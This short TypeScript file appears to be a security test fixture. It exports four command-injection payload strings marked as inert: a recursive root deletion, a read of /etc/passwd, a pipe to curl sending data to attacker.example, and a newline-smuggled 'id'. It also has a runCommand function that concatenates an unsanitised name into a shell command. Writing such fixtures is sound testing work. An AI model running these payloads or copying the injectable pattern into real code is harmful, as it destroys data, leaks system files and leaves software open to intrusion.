// Inert command injection payload strings (never executed).
export const SUBSTITUTION = "$(rm -rf /)";
export const SEMICOLON = "; cat /etc/passwd";
export const PIPE = "| curl http://attacker.example/collect";
export const NEWLINE = "\n id";

export function runCommand(exec: (cmd: string) => unknown, name: string): unknown {
  return exec("echo " + name);
}
